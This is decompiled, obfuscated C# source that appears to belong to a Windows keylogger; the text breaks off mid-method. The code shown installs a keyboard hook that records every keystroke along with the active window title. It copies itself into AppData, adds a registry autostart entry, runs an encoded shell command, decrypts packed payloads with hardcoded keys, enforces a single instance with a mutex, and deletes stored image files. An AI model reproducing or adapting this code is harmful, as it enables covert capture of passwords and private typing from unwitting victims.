using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using ns1;
using ns2;
using ns3;
using ns6;

namespace ns0;

internal class Class5
{
	static void smethod_0(Class17.Class21 class21_0, byte[] byte_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
		}
		int num3 = 0;
		int num4 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num3;
			num3 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num5 = array2[j] & 0x1FF80;
				int num6 = num3 & 0x1FF80;
				num4 += num6 - num5 >> 16 - j;
			}
		}
		class21_0.short_0 = new short[num4];
		int num7 = 512;
		for (int num8 = 15; num8 >= 10; num8--)
		{
			int num9 = num3 & 0x1FF80;
			num3 -= array[num8] << 16 - num8;
			int num10 = num3 & 0x1FF80;
			for (int k = num10; k < num9; k += 128)
			{
				class21_0.short_0[Class5.smethod_18(k)] = (short)((-num7 << 4) | num8);
				num7 += 1 << num8 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num11 = byte_0[l];
			if (num11 == 0)
			{
				continue;
			}
			num3 = array2[num11];
			int num12 = Class5.smethod_18(num3);
			if (num11 <= 9)
			{
				do
				{
					class21_0.short_0[num12] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < 512);
			}
			else
			{
				int num13 = class21_0.short_0[num12 & 0x1FF];
				int num14 = 1 << (num13 & 0xF);
				num13 = -(num13 >> 4);
				do
				{
					class21_0.short_0[num13 | (num12 >> 9)] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < num14);
			}
			array2[num11] = num3 + (1 << 16 - num11);
		}
	}

	static void smethod_1()
	{
	}

	static void smethod_2()
	{
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	static extern int GetWindowTextLength(IntPtr intptr_0);

	static int smethod_3(Class17.Class19 class19_0, int int_0)
	{
		if (class19_0.int_2 < int_0)
		{
			if (class19_0.int_0 == class19_0.int_1)
			{
				return -1;
			}
			class19_0.uint_0 |= (uint)(((class19_0.byte_0[class19_0.int_0++] & 0xFF) | ((class19_0.byte_0[class19_0.int_0++] & 0xFF) << 8)) << class19_0.int_2);
			class19_0.int_2 += 16;
		}
		return (int)(class19_0.uint_0 & ((1 << int_0) - 1));
	}

	static byte[] smethod_4(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class5.smethod_6(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class17.Stream0 stream = new Class17.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class5.smethod_39(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class5.smethod_27(stream);
			int num3 = Class5.smethod_27(stream);
			int num4 = Class5.smethod_27(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class5.smethod_39(stream);
			Class5.smethod_39(stream);
			Class5.smethod_39(stream);
			int num5 = Class5.smethod_39(stream);
			int num6 = Class5.smethod_27(stream);
			int num7 = Class5.smethod_27(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class17.Class18 class18_ = new Class17.Class18(array2);
			array = new byte[num5];
			Class5.smethod_42(array, 0, class18_, array.Length);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class5.smethod_39(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class5.smethod_39(stream);
					num11 = Class5.smethod_39(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class17.Class18 class18_2 = new Class17.Class18(array3);
					Class5.smethod_42(array, i, class18_2, num11);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 213, 155, 45, 40, 220, 123, 241, 112 };
				byte[] byte_2 = new byte[8] { 133, 179, 22, 55, 163, 81, 169, 218 };
				using Class16 class16_ = new Class16();
				using ICryptoTransform cryptoTransform = Class5.smethod_25(byte_, bool_0: true, class16_, byte_2);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class5.smethod_4(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class15 class15_ = new Class15();
				using ICryptoTransform cryptoTransform2 = Class5.smethod_32(byte_4, class15_, bool_0: true, byte_5);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class5.smethod_4(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static void smethod_5()
	{
		try
		{
			Interaction.Shell(Class5.smethod_38("ipzJy8+1xtzr2aO15ufarM+gpsKqz9Giy7/HjaPRZ4fk3dSry9+Zwprb4OjLtJWf0NisyZvZ3qyCrriqZ6q4wLOjtby6up6jv7nClMvQ5tW60dPowp7L29jVvtXJt9u51NLi2p3H3+fPttDJxNWzy9Ddy7q+wO3Zu8falJW9grLix6nO0sC7iIKc6IaZp7TTqp6xv7iGdsaNpIZ2yAE=", "False"), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	static extern IntPtr GetForegroundWindow();

	static bool smethod_6(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static void smethod_7()
	{
	}

	static Class17.Class21 smethod_8(Class17.Class22 class22_0)
	{
		byte[] array = new byte[class22_0.int_4];
		Array.Copy(class22_0.byte_1, class22_0.int_3, array, 0, class22_0.int_4);
		return new Class17.Class21(array);
	}

	static bool smethod_9(Class17.Class18 class18_0)
	{
		int num = Class5.smethod_40(class18_0.class20_0);
		while (num >= 258)
		{
			switch (class18_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class5.smethod_16(class18_0.class21_0, class18_0.class19_0)) & -256) == 0)
				{
					Class5.smethod_41(class18_0.class20_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class18_0.int_6 = Class17.Class18.int_0[num2 - 257];
					class18_0.int_5 = Class17.Class18.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class18_0.class21_1 = null;
				class18_0.class21_0 = null;
				class18_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class18_0.int_5 > 0)
				{
					class18_0.int_4 = 8;
					int num4 = Class5.smethod_3(class18_0.class19_0, class18_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class5.smethod_20(class18_0.class19_0, class18_0.int_5);
					class18_0.int_6 += num4;
				}
				class18_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class5.smethod_16(class18_0.class21_1, class18_0.class19_0);
				if (num2 >= 0)
				{
					class18_0.int_7 = Class17.Class18.int_2[num2];
					class18_0.int_5 = Class17.Class18.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class18_0.int_5 > 0)
				{
					class18_0.int_4 = 10;
					int num3 = Class5.smethod_3(class18_0.class19_0, class18_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class5.smethod_20(class18_0.class19_0, class18_0.int_5);
					class18_0.int_7 += num3;
				}
				Class5.smethod_13(class18_0.class20_0, class18_0.int_6, class18_0.int_7);
				num -= class18_0.int_6;
				class18_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static int smethod_10(int int_0, int int_1, ref Class9.Struct0 struct0_0)
	{
		try
		{
			string text = Class5.smethod_50(Class5.GetForegroundWindow());
			if (Operators.CompareString(text, Class9.string_1, false) != 0)
			{
				Class9.string_1 = text;
				Class6.string_12 = Class6.string_12 + Environment.NewLine + Class5.smethod_38("kYuWkIIQ", "False") + " " + text + " " + Class5.smethod_38("bIefprsH", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread.Sleep(10);
			string text2 = null;
			int result = default(int);
			if (int_1 == 256 || int_1 == 260)
			{
				checked
				{
					switch (struct0_0.int_0)
					{
					case 8:
						Class6.string_12 = Class6.string_12.Substring(0, Class6.string_12.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 18:
						text2 = Class5.smethod_38("W7Gi1M6Ydg0=", "False");
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? Class5.smethod_38("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : Class5.smethod_38("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = Class5.smethod_38("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = Class5.smethod_38("RyA=", "False");
						break;
					case 33:
						text2 = Class5.smethod_38("Zbu708uqtdvPhAE=", "False");
						break;
					case 34:
						text2 = Class5.smethod_38("VKqqwrqZk8nYwZFvFA==", "False");
						break;
					case 35:
						text2 = Class5.smethod_38("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = Class5.smethod_38("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = Class5.smethod_38("U6mVvXIT", "False");
						break;
					case 38:
						text2 = Class5.smethod_38("SJ6ssmce", "False");
						break;
					case 39:
						text2 = Class5.smethod_38("X7WjyX4H", "False");
						break;
					case 40:
						text2 = Class5.smethod_38("O5GXpVor", "False");
						break;
					case 46:
						text2 = Class5.smethod_38("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = Class5.smethod_38("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(Class5.smethod_38("VBM=", "False")) });
							switch (struct0_0.int_0)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(struct0_0.int_0);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(struct0_0.int_0 + 32).ToLower() : char.ConvertFromUtf32(struct0_0.int_0 + 32).ToUpper());
						break;
					case 91:
					case 92:
						text2 = Class5.smethod_38("Q5mgubBls73EsZGbaSY=", "False");
						break;
					case 96:
						text2 = Class5.smethod_38("dQI=", "False");
						break;
					case 97:
						text2 = Class5.smethod_38("Wx0=", "False");
						break;
					case 98:
						text2 = Class5.smethod_38("ZhM=", "False");
						break;
					case 99:
						text2 = Class5.smethod_38("SjA=", "False");
						break;
					case 100:
						text2 = Class5.smethod_38("TC8=", "False");
						break;
					case 101:
						text2 = Class5.smethod_38("VCg=", "False");
						break;
					case 102:
						text2 = Class5.smethod_38("WyI=", "False");
						break;
					case 103:
						text2 = Class5.smethod_38("dQk=", "False");
						break;
					case 104:
						text2 = Class5.smethod_38("Vyg=", "False");
						break;
					case 105:
						text2 = Class5.smethod_38("dwk=", "False");
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = Class5.smethod_38("UaedGA==", "False") + Conversions.ToString(struct0_0.int_0 - 111) + Class5.smethod_38("o4EC", "False");
						break;
					case 144:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_NumLock()) ? Class5.smethod_38("ZLq45tCQzs3cg5PNx5EG", "False") : Class5.smethod_38("SZ+dy7V1s7LBaHiqtbNoHQ==", "False"));
						break;
					case 16:
					case 160:
					case 161:
						text2 = null;
						break;
					case 162:
					case 163:
						text2 = Class5.smethod_38("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = Class5.smethod_38("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("cBI=", "False") : Class5.smethod_38("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("WSs=", "False") : Class5.smethod_38("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("YhE=", "False") : Class5.smethod_38("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("cAQ=", "False") : Class5.smethod_38("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("ZRA=", "False") : Class5.smethod_38("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("aQ0=", "False") : Class5.smethod_38("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("lBM=", "False") : Class5.smethod_38("vQg=", "False"));
						break;
					default:
						text2 = null;
						break;
					case 219:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("mgg=", "False") : Class5.smethod_38("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("czA=", "False") : Class5.smethod_38("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("gSM=", "False") : Class5.smethod_38("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class5.smethod_38("bQE=", "False") : Class5.smethod_38("Ths=", "False"));
						break;
					}
					Class6.string_12 += text2;
					Class6.string_24 = Class6.string_12;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			int result = 0;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static int smethod_11(Class17.Class20 class20_0)
	{
		return class20_0.int_1;
	}

	static void smethod_12()
	{
		try
		{
			Thread thread = new Thread((ThreadStart)Class5.smethod_2);
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread2 = new Thread((ThreadStart)Class5.smethod_22);
			thread2.IsBackground = true;
			thread2.Start();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_13(Class17.Class20 class20_0, int int_0, int int_1)
	{
		if ((class20_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class20_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class20_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class20_0.byte_0, num, class20_0.byte_0, class20_0.int_0, int_0);
				class20_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class20_0.byte_0[class20_0.int_0++] = class20_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class5.smethod_23(class20_0, num, int_0, int_1);
		}
	}

	static void smethod_14(int int_0, byte[] byte_0, Class17.Class19 class19_0, int int_1)
	{
		if (class19_0.int_0 < class19_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_1 + int_0;
		if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
		{
			if (((uint)int_0 & (true ? 1u : 0u)) != 0)
			{
				class19_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class19_0.int_2);
				class19_0.int_2 += 8;
			}
			class19_0.byte_0 = byte_0;
			class19_0.int_0 = int_1;
			class19_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static bool smethod_15(Class17.Class19 class19_0)
	{
		return class19_0.int_0 == class19_0.int_1;
	}

	static int smethod_16(Class17.Class21 class21_0, Class17.Class19 class19_0)
	{
		int num;
		int num2;
		if ((num = Class5.smethod_3(class19_0, 9)) >= 0)
		{
			if ((num2 = class21_0.short_0[num]) >= 0)
			{
				Class5.smethod_20(class19_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class5.smethod_3(class19_0, int_)) >= 0)
			{
				num2 = class21_0.short_0[num3 | (num >> 9)];
				Class5.smethod_20(class19_0, num2 & 0xF);
				return num2 >> 4;
			}
			int int_2 = class19_0.int_2;
			num = Class5.smethod_3(class19_0, int_2);
			num2 = class21_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= int_2)
			{
				Class5.smethod_20(class19_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int int_3 = class19_0.int_2;
		num = Class5.smethod_3(class19_0, int_3);
		num2 = class21_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= int_3)
		{
			Class5.smethod_20(class19_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static void smethod_17()
	{
		Mutex mutex = new Mutex(initiallyOwned: false, "HYIQ");
		if (!mutex.WaitOne(0, exitContext: false))
		{
			mutex.Close();
			mutex = null;
			ProjectData.EndApp();
		}
	}

	static short smethod_18(int int_0)
	{
		return (short)((Class17.Class23.byte_0[int_0 & 0xF] << 12) | (Class17.Class23.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class17.Class23.byte_0[(int_0 >> 8) & 0xF] << 4) | Class17.Class23.byte_0[int_0 >> 12]);
	}

	static void smethod_19()
	{
	}

	static void smethod_20(Class17.Class19 class19_0, int int_0)
	{
		class19_0.uint_0 >>= int_0;
		class19_0.int_2 -= int_0;
	}

	static int smethod_21(Class17.Class19 class19_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class19_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class19_0.uint_0;
			class19_0.uint_0 >>= 8;
			class19_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class19_0.int_1 - class19_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class19_0.byte_0, class19_0.int_0, byte_0, int_0, int_1);
		class19_0.int_0 += int_1;
		if (((uint)(class19_0.int_0 - class19_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class19_0.uint_0 = class19_0.byte_0[class19_0.int_0++] & 0xFFu;
			class19_0.int_2 = 8;
		}
		return num + int_1;
	}

	static void smethod_22()
	{
	}

	static void smethod_23(Class17.Class20 class20_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class20_0.byte_0[class20_0.int_0++] = class20_0.byte_0[int_0++];
			class20_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static void smethod_24()
	{
	}

	static ICryptoTransform smethod_25(byte[] byte_0, bool bool_0, Class16 class16_0, byte[] byte_1)
	{
		class16_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class16_0.object_0, new object[1] { byte_0 });
		class16_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class16_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class16_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class16_0.object_0, new object[0]);
	}

	static void smethod_26(Class17.Class19 class19_0)
	{
		class19_0.uint_0 >>= class19_0.int_2 & 7;
		class19_0.int_2 &= -8;
	}

	static int smethod_27(Class17.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_28()
	{
		string name = Class5.smethod_38("aK+vt6dFkrCzqIqyIw==", "False");
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class5.smethod_38("hZG4ubqYt768vIUe", "False") + Class5.smethod_38("daW5oZlplqDGvFWnxbkj", "False");
		int num = 0;
		try
		{
			if (!File.Exists(text))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text, overwrite: true);
			}
		}
		catch (Exception ex)
		{
			int num2 = default(int);
			ProjectData.SetProjectError(ex, num2);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			int num2 = 1;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class5.smethod_38("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
				registryKey.SetValue(name, text);
				registryKey.Close();
				break;
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2, num2);
				if (num == 3)
				{
					ProjectData.ClearProjectError();
					break;
				}
				num = checked(num + 1);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SetWindowsHookExA(int int_0, Class9.Delegate0 delegate0_0, int int_1, int int_2);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowTextA(int int_0, StringBuilder stringBuilder_0, int int_1);

	static int smethod_29(Class17.Class20 class20_0, Class17.Class19 class19_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class20_0.int_1), Class5.smethod_31(class19_0));
		int num = 32768 - class20_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class5.smethod_21(class19_0, class20_0.byte_0, class20_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class5.smethod_21(class19_0, class20_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class5.smethod_21(class19_0, class20_0.byte_0, class20_0.int_0, int_0);
		}
		class20_0.int_0 = (class20_0.int_0 + num2) & 0x7FFF;
		class20_0.int_1 += num2;
		return num2;
	}

	static void smethod_30(Class15 class15_0)
	{
		class15_0.type_0.GetMethod("Clear")!.Invoke(class15_0.object_0, new object[0]);
	}

	static int smethod_31(Class17.Class19 class19_0)
	{
		return class19_0.int_1 - class19_0.int_0 + (class19_0.int_2 >> 3);
	}

	static ICryptoTransform smethod_32(byte[] byte_0, Class15 class15_0, bool bool_0, byte[] byte_1)
	{
		class15_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class15_0.object_0, new object[1] { byte_0 });
		class15_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class15_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class15_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class15_0.object_0, new object[0]);
	}

	static void smethod_33()
	{
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class5.smethod_38("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class5.smethod_38("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class5.smethod_38("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class5.smethod_38("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class5.smethod_38("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class5.smethod_38("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_34(Class17.Class18 class18_0)
	{
		switch (class18_0.int_4)
		{
		case 2:
		{
			if (class18_0.bool_0)
			{
				class18_0.int_4 = 12;
				return false;
			}
			int num = Class5.smethod_3(class18_0.class19_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class5.smethod_20(class18_0.class19_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class18_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class5.smethod_26(class18_0.class19_0);
				class18_0.int_4 = 3;
				break;
			case 1:
				class18_0.class21_0 = Class17.Class21.class21_0;
				class18_0.class21_1 = Class17.Class21.class21_1;
				class18_0.int_4 = 7;
				break;
			case 2:
				class18_0.class22_0 = new Class17.Class22();
				class18_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class18_0.int_8 = Class5.smethod_3(class18_0.class19_0, 16)) < 0)
			{
				return false;
			}
			Class5.smethod_20(class18_0.class19_0, 16);
			class18_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class5.smethod_3(class18_0.class19_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class5.smethod_20(class18_0.class19_0, 16);
			class18_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class5.smethod_29(class18_0.class20_0, class18_0.class19_0, class18_0.int_8);
			class18_0.int_8 -= num3;
			if (class18_0.int_8 == 0)
			{
				class18_0.int_4 = 2;
				return true;
			}
			return !Class5.smethod_15(class18_0.class19_0);
		}
		case 6:
			if (!Class5.smethod_46(class18_0.class22_0, class18_0.class19_0))
			{
				return false;
			}
			class18_0.class21_0 = Class5.smethod_44(class18_0.class22_0);
			class18_0.class21_1 = Class5.smethod_8(class18_0.class22_0);
			class18_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class5.smethod_9(class18_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static void smethod_35()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class5.smethod_38("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class5.smethod_38("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class5.smethod_38("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class5.smethod_38("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			Thread.Sleep(25000);
